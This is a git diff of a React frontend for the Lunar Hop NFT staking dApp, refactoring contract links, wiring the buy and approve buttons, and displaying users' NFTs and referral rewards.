-            return (
-                <>
-                    <Button outline className="custom-button mt-3 source" onClick={() => { setActiveTab(1) }}>Start a stake to see your info</Button>
-                </>
-            )
-        }
-        const listElements = userInfo.map(
-            (element) => {
-                // const depoStart = new Date(element.depoTime / 1000).toDateString();
-                const depoStart = new Date(Number(element.depoTime) * 1000).toDateString()
-                const depoAmount = Number(ethers.utils.formatEther(element.amt)).toFixed(2)
-                const initialWithdrawn = element.initialWithdrawn;
-                const key = Number(element.key);
-                if (initialWithdrawn == false) {
-                    return (
-                        <>
-                            <DropdownItem onClick={() => {
-                                withdrawInitial(key)
-                            }}>
-                                <Col className="text-center">
-                                    <Row>${depoAmount}</Row>
-                                    <Row><small className="text-muted">{depoStart}</small></Row>
-                                </Col>
-                            </DropdownItem>
-                            <div></div>
-                        </>
-                    )
-                }
-            }
-        )
-        return (
-            <>
-                <ButtonDropdown className="custom-button source mt-4" toggle={() => { setOpen(!dropdownOpen) }}
-                    isOpen={dropdownOpen}>
-                    <DropdownToggle outline caret className="font-weight-bold source">
-                        Unstake
-                    </DropdownToggle>
-                    <DropdownMenu>
-                        <DropdownItem header style={{ color: 'black' }}>Your current stakes
-                        </DropdownItem>
-                        {listElements}
-                    </DropdownMenu>
-                </ButtonDropdown>
-            </>
-        )
-    }
 
     const copyFunc = () => {
         navigator.clipboard.writeText(window.location + "?ref=" + userWalletAddress);
@@ -1098,7 +626,7 @@ function WealthMountain() {
                             <div onClick={() => {
                                 setMobile(true)
                             }}>
-                                <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
+                                <a href={scanLinkSuffix + wealthContract} target="_blank" rel="noreferrer"
                                     className="mobile-menu-item"
                                 >
                                     CONTRACT
@@ -1107,22 +635,12 @@ function WealthMountain() {
                             <div onClick={() => {
                                 setMobile(true)
                             }}>
-                                <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"
+                                <a href="/hopdoc.pdf" target="_blank" rel="noreferrer"
                                     className="mobile-menu-item"
                                 >
                                     <span> HOP PAPER </span>
                                 </a>
                             </div>
-                            <div onClick={() => {
-                                setMobile(true)
-                            }}>
-                                <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"
-                                    className="mobile-menu-item"
-                                >
-                                    <span> BUY NFT </span>
-                                </a>
-                            </div>
-                            
                         </div>
                         <div style={{ flex: 1 }}></div>
                         <Button
@@ -1149,46 +667,30 @@ function WealthMountain() {
                 }
             {/* </Container> */}
             <div className="custom-header">
-                {/* <Card className="px-5 py-2"> */}
                 <img
                     alt="..."
                     src={logoImg}
                     style={{ width: 'auto', height: '28px' }}
                 />
-                {/* <h2 className="text-white font-weight-bolder">LUNAR HOP</h2> */}
-                {/* </Card> */}
                 <div className="header_menu">
                     <Item>
-                        <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
+                        <a href={scanLinkSuffix + wealthContract} target="_blank" rel="noreferrer"
                             style={{
                                 textDecoration: 'none',
                                 fontWeight: "bolder",
                             }}
                         >
                             <span>CONTRACT </span>
-                            {/* <SiBinance/> */}
                         </a>
                     </Item>
                     <Item>
-                        <a href="/whitepaper.pdf" target="_blank"
+                        <a href="/hopdoc.pdf" target="_blank"
                             style={{
                                 textDecoration: 'none',
                                 fontWeight: "bolder",
                             }}
                         >
                             <span>HOP PAPER</span>
-                            {/* <FaDiscord/> */}
-                        </a>
-                    </Item>
-                    <Item>
-                        <a href="/whitepaper.pdf" target="_blank"
-                            style={{
-                                textDecoration: 'none',
-                                fontWeight: "bolder",
-                            }}
-                        >
-                            <span>BUY NFT</span>
-                            {/* <FaDiscord/> */}
                         </a>
                     </Item>
                 </div>
@@ -1211,7 +713,7 @@ function WealthMountain() {
             <Container>
                 <CardDeck>
                     <Card className='banner-card'>
-                        <h2 className='text-dark text-uppercase' style={{fontWeight:'900'}}>Welcome to the Lunar Hop NFT!</h2>
+                        <h2 className='text-white text-uppercase font-weight-900' >Welcome to the Lunar Hop NFT!</h2>
                         {/* <p style={{fontFamily:'Montserrat', fontSize:'54px', fontWeight:'900', lineHeight:'72px'}}>Welcome to the Lunar Hop NFT!</p> */}
                         <h6 className='text-white font-weight-bold' style={{lineHeight:'2.2rem'}}>The NFT collectibles that will attract good luck and make your wallet puff! The more Lunar Hop NFT you have, the greater the wealth you will attract.</h6>
                         <h6 className='pt-4'>Follow our telegram for more updates</h6>
@@ -1245,56 +747,28 @@ function WealthMountain() {
                     <TabPanel value={activeTab} selectedIndex={0}>
                         <Row>
                             <Col className="text-center">
-                                <h3 className='pb-4 text-dark font-weight-bolder'>Purchase Lunar Hop NFT</h3>
+                                <h3 className='pb-4 text-white font-weight-900'>Purchase Lunar Hop NFT</h3>
                             </Col>
                         </Row>
-                        <CardDeck style={{justifyContent: 'center'}}>
-                            {nutritionFacts1.map((item, index) => (
+                        <CardDeck style={{justifyContent: 'center', maxWidth:'900px', alignSelf: 'center'}}>
+                            {LunarHopNFTs.map((item, index) => (
                                 <div className='nft-card'>
-                                    <Typography variant="h5">
+                                    <Typography variant="h5" color={index < 4 ? 'white' : 'yellow'} paddingBottom={1}>
                                         {item[0].name}
                                     </Typography>
                                     <img src={item[0].path} alt="nft" width="100%" style={{borderRadius: '20px'}}/>
                                     <CardContent>
                                         <Box paddingTop={2}>
-                                            {item[1].properties.map((f) => (
+                                            {item[1].properties.map((f, key) => (
                                                 <Grid container key={f.label} justifyContent="space-between">
-                                                <Typography variant="body1" className='text-white' gutterBottom >
-                                                {f.label}
-                                                </Typography>
-                                                <Typography className='text-white' gutterBottom >{f.value}</Typography>
-                                            </Grid>
-                                            ))}
-                                        </Box>
-                                        <div style={{textAlign:'center', display:'flex', justifyContent:'space-between', marginTop:'10px' }}>
-                                            <button className='btn_buy' >Approve</button>
-                                            <button className='btn_buy' >Buy</button>
-                                        </div>
-                                    </CardContent>
-                                </div>
-                            ))}
-                        </CardDeck>
-                        <CardDeck style={{justifyContent: 'center'}}>
-                            {nutritionFacts2.map((item, index) => (
-                                <div className='nft-card'>
-                                    <Typography variant="h5" color={index == 0 ? 'white' : 'yellow'} paddingBottom={1}>
-                                        {item[0].name}
-                                    </Typography>
-                                    <img src={item[0].path} alt="nft" width="100%" style={{borderRadius: '20px'}}/>
-                                    <CardContent>
-                                        <Box paddingTop={2}>
-                                            {item[1].properties.map((f) => (
-                                                <Grid container key={f.label} justifyContent="space-between">
-                                                <Typography variant="body1" className='text-white' gutterBottom >
-                                                {f.label}
-                                                </Typography>
-                                                <Typography className='text-white' gutterBottom >{f.value}</Typography>
-                                            </Grid>
+                                                    <Typography variant="body1" className='text-white' gutterBottom >{f.label}</Typography>
+                                                    <Typography className='text-yellow' gutterBottom >{f.value + " " + (key == 2 ? 'days' : '$')}</Typography>
+                                                </Grid>
                                             ))}
                                         </Box>
                                         <div style={{textAlign:'center', display:'flex', justifyContent:'space-between', marginTop:'10px'}}>
-                                            <button className='btn_buy' >Approve</button>
-                                            <button className='btn_buy' >Buy</button>
+                                            <button className='btn_buy' onClick={() => approveButton(index)}>Approve</button>
+                                            <button className='btn_buy' onClick={() => buyButton(index)}>Buy</button>
                                         </div>
                                     </CardContent>
                                 </div>
@@ -1302,46 +776,64 @@ function WealthMountain() {
                         </CardDeck>
                         
                     </TabPanel>
+
                     <TabPanel value={activeTab} selectedIndex={1}>
                         <Container className='my-4'>
                             <CardDeck>
                                 <Card body className="text-center" style={{borderRadius: '32px 32px 48px 48px'}}>
-                                    <h5 className="calvino text-white">Wealth Gained</h5>
+                                    <h5 className="calvino text-white">Total Gained</h5>
                                     <h5 className="source font-weight-bold text-lightblue">
-                                        {Number(contractBalance) === 0 ? <>$0</> : <>${Number(contractBalance).toFixed(0)}</>}
+                                        {userDepositInfo.length === 0 ? <>$0</> : <>${Number(ethers.utils.formatEther(userDepositInfo.totalAccured)).toFixed(0)}</>}
                                     </h5>
                                 </Card>
                                 <Card body className="text-center" style={{borderRadius: '32px 32px 48px 48px'}}>
-                                    <h5 className="calvino text-white">Daily Earnings</h5>
+                                    <h5 className="calvino text-white">Total Rewards</h5>
                                     <h5 className="source font-weight-bold text-lightblue">
-                                        {Number(totalUsers) === 0 ? <>?</> : <>{Number(totalUsers)}</>}
+                                        ${Number(totalClaimableRewards).toFixed(0)}
                                     </h5>
                                 </Card>
                                 <Card body className="text-center" style={{borderRadius: '32px 32px 48px 48px'}}>
-                                    <h5 className="calvino text-white">Referral Rewards</h5>
+                                    <h5 className="calvino text-white">Total Referral Rewards</h5>
                                     <h5 className="source font-weight-bold text-lightblue">
-                                        10%
+                                        {userDepositInfo.length === 0 ? <>$0</> : <>${Number(ethers.utils.formatEther(userDepositInfo.totalWithRefBonus)).toFixed(0)}</>}
                                     </h5>
                                 </Card>
                             </CardDeck>
+                        </Container>
+                        <Container>
+                        <Row>
+                            <Col className="text-center">
+                                <h3 className='pb-4 text-white font-weight-900'>My Lunar Hop NFT</h3>
+                            </Col>
+                        </Row>
+                        
+                        <div>
+                        <CardDeck className='nft-card-container'>
+                            {userInfo.map((item, index) => (
+                                <MyNftCard contract={contract} LunarHopNFTs = {LunarHopNFTs} userInfo={item} no={index}/>
+                            ))}
+                        </CardDeck>
+                        </div>
                         </Container>
                         <CardDeck className="p-3">
                             <Card body className="text-center text-lightblue" style={{borderRadius: '32px 32px 48px 48px'}}>
                                 <CardDeck className="sub-card">
                                     <Card>
-                                        <h4 className="calvino text-white">Total Wealth Earned</h4>
+                                        <h4 className="calvino text-white">Referral Rewards</h4>
                                         <CardDeck>
                                             {/* <Card style={{ background: "transparent" }}>
                                                 <h4 className="source font-weight-bold text-white"><TotalEarnedPercent /></h4>
                                             </Card> */}
                                             <Card style={{ background: "transparent" }}>
-                                                <h4 className="source font-weight-bold text-white">$<TotalEarnedValue /></h4>
+                                                <h4 className="source font-weight-bold text-white">
+                                                    {userDepositInfo.length === 0 ? <>$0</> : <>${Number(ethers.utils.formatEther(userDepositInfo.refBonus)).toFixed(0)}</>}
+                                                </h4>
                                             </Card>
                                         </CardDeck>
                                         <Row>
                                             <Col>
                                                 {/* <Button className="custom-button source mt-3" outline onClick={compound}>compound</Button> */}
-                                                <Button className="custom-button source mt-3" outline onClick={withdrawDivs}>Withdraw</Button>
+                                                <Button className="custom-button source mt-3" outline onClick={withdrawRefBonus}>Withdraw</Button>
                                             </Col>
                                         </Row>
                                     </Card>
@@ -1530,13 +1022,15 @@ function WealthMountain() {
                     </TabPanel>
                 </Container>
             </div>
-            <Container style={{marginTop:'50px'}}>
-                <h3 className='py-3 text-darker text-center font-weight-bolder'>Frequently Asked Questions</h3>
-                <Accordion style={{padding:'0px 30px'}}>
+            
+            <div style={{marginTop:'50px'}}>
+                <h3 className='py-3 text-white text-center font-weight-900'>Frequently Asked Questions</h3>
+                <FAQList/>
+                {/* <Accordion style={{padding:'0px 30px'}}>
                 {faqData.map((item, index) => {
                     return (
                         // <Reveal key={index} className='onStep' keyframes={fadeInUp} delay={100 * index} duration={800}>
-                        <Accordion.Item eventKey={{ index }}>
+                        <Accordion.Item eventKey={{ index }} key={index}>
                             <Accordion.Header style={{margin: 'auto'}}>
                                 <div className="faqheading">
                                     {item.title}
@@ -1552,16 +1046,16 @@ function WealthMountain() {
                     )
                 }
                 )}
-                </Accordion>
-            </Container>            
+                </Accordion> */}
+            </div>            
 
             <div className="pt-3 text-center calvino text-lightblue">
                 <Card style={{ borderRadius: '0px', padding: '40px 10px 30px 10px' }}>
                     <CardDeck className="custom-footer">
                         {/* <a href="https://georgestamp.xyz/2022/09/wc-miner-busd/" target="_blank" rel="noreferrer"> AUDIT </a> */}
                         {/* <SelectObject value={auditNo} onChangeAuditNo={onChangeAuditNo}/> */}
-                        <a href="https://bscscan.com/address/" target="_blank" rel="noreferrer"> CONTRACT </a>
-                        <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"> HOP PAPER </a>
+                        <a href={scanLinkSuffix + wealthContract} target="_blank" rel="noreferrer"> CONTRACT </a>
+                        <a href="/hopdoc.pdf" target="_blank" rel="noreferrer"> HOP PAPER </a>
                         <a href="https://twitter.com/lunar_hop" target="_blank" rel="noreferrer"> TWITTER </a>
                         <a href="https://t.me/Lunarhop" target="_blank" rel="noreferrer"> TELEGRAM </a>
                     </CardDeck>
